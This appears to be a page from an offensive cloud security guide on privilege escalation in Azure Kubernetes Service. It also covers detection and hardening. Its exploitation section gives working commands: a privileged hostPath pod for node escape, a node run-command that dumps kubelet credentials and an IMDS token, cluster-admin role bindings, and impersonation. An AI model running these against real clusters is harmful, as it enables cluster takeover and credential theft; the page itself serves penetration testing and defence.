---
cstg_id: CSTG-AZURE-AKS-PRIVESC
title: "AZURE Aks - Privilege Escalation"
provider: azure
service: aks
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action"
  - "Microsoft.ContainerService/managedClusters/listClusterUserCredential/action"
  - "Microsoft.ContainerService/managedClusters/runCommand/action"
  - "Microsoft.ContainerService/managedClusters/write"
  - "Microsoft.ContainerService/managedClusters/agentPools/write"
  - "Microsoft.Compute/virtualMachineScaleSets/virtualMachines/runCommand/action"
  - "Kubernetes RBAC: create pods; create/update roles, rolebindings, clusterroles, clusterrolebindings; create serviceaccounts/token; get secrets; escalate; bind; impersonate"
tools:
  - az cli (azure-cli)
  - az aks
  - kubectl
  - kubelogin
  - Azure REST API
  - kube-apiserver
  - Instance Metadata Service (IMDS)
  - Peirates
  - kubeletctl
  - BadPods / privileged pod manifests
references:
  - "https://learn.microsoft.com/en-us/azure/aks/concepts-identity"
  - "https://learn.microsoft.com/en-us/azure/aks/manage-azure-rbac"
  - "https://learn.microsoft.com/en-us/azure/aks/access-private-cluster"
  - "https://learn.microsoft.com/en-us/azure/aks/use-managed-identity"
  - "https://learn.microsoft.com/en-us/azure/aks/workload-identity-overview"
  - "https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping"
  - "https://kubernetes.io/docs/concepts/security/pod-security-standards/"
  - "https://hackingthe.cloud/azure/"
  - "https://microsoft.github.io/Threat-Matrix-for-Kubernetes/"
license: CC BY-SA 4.0
---

## Summary

This page covers privilege escalation in and around Azure Kubernetes Service. Two authorization planes are in play and escalation routinely crosses between them:

1. **Azure RBAC -> cluster control**: an Azure principal with the right `Microsoft.ContainerService/*` actions can pull an admin kubeconfig or run arbitrary commands on the cluster, gaining `cluster-admin` without ever holding a Kubernetes role.
2. **Inside Kubernetes -> higher Kubernetes privilege**: a foothold (a token, a pod, or a namespaced role) is escalated to `cluster-admin` via permissive RBAC verbs (`escalate`, `bind`, `impersonate`, write to RBAC objects), pod creation, or service-account token minting.
3. **Inside Kubernetes -> Azure plane**: a pod escapes to the node or reaches IMDS to steal the **kubelet managed-identity** token, or abuses **Workload Identity** federation, converting in-cluster code execution into Azure RBAC privilege. That crossover is detailed in the [lateral movement](../04-lateral-movement/azure-aks-lateral.md) page; here we focus on gaining control of the cluster itself.

The attacker objective is to turn the access enumerated in [AKS enumeration](../02-services/azure-aks-enum.md) into `cluster-admin` (or an equivalent ability to run arbitrary workloads) and/or into control of the cluster's Azure identities. Each Azure action and each Kubernetes permission below is presented as its own escalation path.

## Prerequisites

- An assumed-breach foothold: either an Azure principal with one or more of the listed `Microsoft.ContainerService` actions, or an in-cluster identity (a service-account token, a kubeconfig, or code execution in a pod).
- For Azure-plane paths: the ability to call ARM (CLI/REST) as the compromised principal.
- For Kubernetes-plane paths: a working kubeconfig or a mounted service-account token (`/var/run/secrets/kubernetes.io/serviceaccount/token`) and network reachability to the API server (for private clusters, from within the VNet or via the `command invoke` proxy).
- Knowledge from the enumeration phase of which identities/roles exist and what `kubectl auth can-i --list` reports for the current subject.

## Misconfigurations & Findings

- **Static admin (local) accounts enabled** — `listClusterAdminCredential` returns a kubeconfig with `cluster-admin` that bypasses Entra/Conditional Access.
- **Broad assignment of the AKS Cluster Admin / RBAC Cluster Admin roles** or of `runCommand` to non-administrators.
- **Permissive Kubernetes RBAC**: roles granting `*` verbs, `escalate`/`bind`/`impersonate`, write access to `roles`/`clusterroles`/`*bindings`, `create` on `pods`, or `create` on `serviceaccounts/token`.
- **No Pod Security enforcement**, allowing privileged / `hostPID` / `hostPath` pods that escape to the node.
- **Default service-account tokens automounted** and bound to meaningful RBAC.
- **Over-privileged kubelet identity / workload identities**, making the Azure-crossover paths high-impact.

## Exploitation

### Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action

This action (granted by the **Azure Kubernetes Service Cluster Admin Role**, **Contributor**, or **Owner**) returns the cluster's static local-admin kubeconfig, which maps to the Kubernetes `cluster-admin` ClusterRole and bypasses Entra integration and Conditional Access entirely.

```bash
az aks get-credentials -g <rg> -n <cluster> --admin
kubectl get secrets -A            # full read of every secret
kubectl auth can-i --list          # expect "*" on "*"
```

Mitigation tripwire: this path is closed only when `disableLocalAccounts=true`. If local accounts are enabled, this is the single fastest route to full cluster control.

### Microsoft.ContainerService/managedClusters/listClusterUserCredential/action

The **Cluster User Role** returns a user kubeconfig. On a non-integrated cluster (Kubernetes-RBAC-only, no Entra) the returned credential is itself `cluster-admin`-equivalent. On an Entra-integrated cluster the kubeconfig still requires an Entra login (`kubelogin`), and effective rights are then whatever Azure/Kubernetes RBAC grants the logged-in identity — so this action is an escalation only when combined with a privileged Entra/RBAC binding.

```bash
az aks get-credentials -g <rg> -n <cluster>
kubelogin convert-kubeconfig -l azurecli
kubectl auth can-i --list
```

### Microsoft.ContainerService/managedClusters/runCommand/action

`command invoke` runs an arbitrary command (including `kubectl`) inside a transient pod on the cluster, executing with cluster-internal context. It also works against **private** clusters because it proxies through the managed control plane, requiring no network line-of-sight to the API server. This converts the Azure action directly into in-cluster code execution.

```bash
# Run kubectl as the cluster from outside the VNet
az aks command invoke -g <rg> -n <cluster> \
  --command "kubectl get secrets -A -o json"

# Stage a manifest and apply it
az aks command invoke -g <rg> -n <cluster> \
  --command "kubectl apply -f pwn.yaml" --file pwn.yaml
```

Because the invoked pod runs with the cluster's context, this is a reliable bootstrap for the Kubernetes-plane paths below even when the API server is private.

### Microsoft.ContainerService/managedClusters/write & agentPools/write

Write on the cluster object lets an attacker change the cluster's security posture to enable an easier path: re-enabling local accounts (`disableLocalAccounts=false`), removing API-server authorized IP ranges, attaching a more privileged identity, or modifying the Entra admin group. Write on agent pools can add a node pool with a chosen image/configuration the attacker controls.

```bash
az aks update -g <rg> -n <cluster> --disable-local-accounts false
az aks update -g <rg> -n <cluster> --api-server-authorized-ip-ranges ""   # open the API server
az aks get-credentials -g <rg> -n <cluster> --admin
```

### Compute runCommand on node VMSS (node resource group)

If the principal holds `Microsoft.Compute/virtualMachineScaleSets/virtualMachines/runCommand/action` on the node VMSS in the `MC_*` resource group, commands can be run as **root on the node**. From the node the attacker reads the kubelet kubeconfig/client cert (`/var/lib/kubelet`, `/etc/kubernetes`), reaches IMDS for the kubelet identity token, and reads every container's mounted secrets.

```bash
NODE_RG=$(az aks show -g <rg> -n <cluster> --query nodeResourceGroup -o tsv)
VMSS=$(az vmss list -g "$NODE_RG" --query "[0].name" -o tsv)
az vmss run-command invoke -g "$NODE_RG" -n "$VMSS" --instance-id 0 \
  --command-id RunShellScript \
  --scripts "cat /var/lib/kubelet/kubeconfig; cat /etc/kubernetes/azure.json; \
    curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
```

### create on pods (Kubernetes RBAC)

The ability to create pods is a near-universal cluster escalation primitive. A pod can be scheduled with the `default` (or any reachable) service account, with host mounts, privilege, or host namespaces, to escape to the node or to use a more privileged SA token.

```bash
# Mount the host filesystem / run privileged to reach node identity and other pods' secrets
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: escal, namespace: default }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: c
    image: alpine
    securityContext: { privileged: true }
    command: ["sleep","infinity"]
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]
EOF
kubectl exec -it escal -- chroot /host bash   # root on node
```

A pod can also be created using a specific privileged service account (`spec.serviceAccountName`), inheriting that SA's API rights.

### create/get on serviceaccounts/token and secrets

`create` on the `serviceaccounts/token` subresource (TokenRequest) lets a subject mint a bearer token for any service account it can name — including a privileged one — escalating to that SA's permissions.

```bash
kubectl create token <privileged-sa> -n <ns>
# Use the returned token as a bearer credential against the API server
```

`get`/`list` on `secrets` in a namespace that contains service-account token secrets, kubeconfigs, or cloud credentials is itself an escalation when those secrets belong to more privileged principals.

### escalate / bind verbs on RBAC objects

Kubernetes blocks a subject from granting itself permissions it does not already hold (privilege-escalation prevention) **unless** it holds the special `escalate` verb on roles/clusterroles or the `bind` verb on rolebindings/clusterrolebindings. A subject with these can author a role/binding that grants `cluster-admin`.

```bash
# With 'escalate' on clusterroles: rewrite a role to all-powerful
kubectl patch clusterrole <editable-role> --type='json' \
  -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'

# With 'bind': bind yourself (or a controlled SA) to cluster-admin
kubectl create clusterrolebinding pwn \
  --clusterrole=cluster-admin --serviceaccount=<ns>:<controlled-sa>
```

### write (create/update) on roles, clusterroles, rolebindings, clusterrolebindings

Direct write to RBAC objects is the canonical Kubernetes escalation: create a binding from your identity (or a controlled SA) to `cluster-admin`, or author a permissive ClusterRole and bind it. (Subject to the `escalate`/`bind` guardrails above, which is why those verbs are so dangerous.)

```bash
kubectl create clusterrolebinding pwn \
  --clusterrole=cluster-admin --user="<entra-object-id>"
```

### impersonate verb

`impersonate` on users/groups/serviceaccounts lets a subject act as a more privileged principal for any request, effectively assuming its permissions.

```bash
kubectl get secrets -A --as=system:serviceaccount:kube-system:clusterrole-aggregation-controller
kubectl auth can-i '*' '*' --as-group=system:masters
```

### Privileged controller / add-on service accounts

Compromising a pod that runs as a powerful built-in or add-on service account (e.g. controllers in `kube-system`, the CSI Key Vault provider, ingress controllers, or monitoring agents) inherits that SA's RBAC and any associated Azure identity. Enumerate `kube-system` SAs and their bindings, then target the pods that use them.

## Detection & Logging

- **Azure Activity Logs** record `listClusterAdminCredential/action`, `listClusterUserCredential/action`, `runCommand/action`, and `managedClusters/write` / `agentPools/write`. Admin-credential pulls, `command invoke`, posture changes (re-enabling local accounts, clearing authorized IP ranges), and node-VMSS `runCommand` are all high-signal events.
- **Kubernetes audit log** (`kube-audit` / `kube-audit-admin` via AKS diagnostic settings) captures pod creation, RBAC object create/update, TokenRequest (`serviceaccounts/token`), impersonation (`impersonate` headers), and secret reads — provided diagnostic settings are enabled (off by default).
- **Microsoft Defender for Containers** ships managed alerts for privileged/host-mount pod creation, new high-privilege RBAC bindings, suspicious `kubectl` and `command invoke` usage, service-account token abuse, and IMDS access from pods.
- **Entra ID sign-in logs** show the token acquisitions behind `get-credentials` and Entra-integrated logins; correlate the acquiring principal with subsequent control-plane actions.

## Remediation & Hardening

- Set `disableLocalAccounts=true` and use Entra + **Azure RBAC for Kubernetes**; this neutralizes the static-admin path.
- Tightly scope the AKS Cluster Admin Role, RBAC Cluster Admin Role, and `runCommand`; treat `command invoke` as an administrative capability.
- Lock down Kubernetes RBAC: eliminate `*` verbs, and grant `escalate`, `bind`, and `impersonate` to nothing outside core controllers; review who can `create pods`, `create serviceaccounts/token`, and write RBAC objects.
- Enforce Pod Security (restricted) / Azure Policy for AKS to block privileged, `hostPID`/`hostNetwork`/`hostPath` pods; restrict node-VMSS `runCommand` via least-privilege RBAC on the node resource group.
- Disable `automountServiceAccountToken` by default; avoid binding RBAC to default SAs or to `system:authenticated`/`system:serviceaccounts`.
- Keep the kubelet and workload identities least-privileged so cross-plane escalation yields little (see lateral movement).
- Enable AKS diagnostic settings (kube-audit categories) and Microsoft Defender for Containers; alert on the Activity-Log events above.

## Tools

- **az aks (get-credentials / command invoke / update)** — Azure-plane escalation and private-cluster code execution.
- **az vmss run-command** — root execution on nodes via the node resource group.
- **kubectl** — pod creation, RBAC manipulation, token minting, impersonation, secret reads; `auth can-i` to validate gained rights.
- **kubelogin** — Entra-integrated cluster login.
- **Peirates / kubeletctl** — automate in-pod privilege escalation, kubelet abuse, and token/secret harvesting.
- **BadPods / privileged pod manifests** — reference manifests for node escape via host mounts/namespaces.

## References

- AKS identity and access concepts — Microsoft Learn
- Manage Azure RBAC for Kubernetes authorization — Microsoft Learn
- Access a private AKS cluster (`command invoke`) — Microsoft Learn
- Use a managed identity in AKS — Microsoft Learn
- Azure Workload Identity overview — Microsoft Learn
- Kubernetes RBAC privilege-escalation prevention — kubernetes.io
- Pod Security Standards — kubernetes.io
- Threat Matrix for Kubernetes — Microsoft
- Azure cloud techniques — hackingthe.cloud
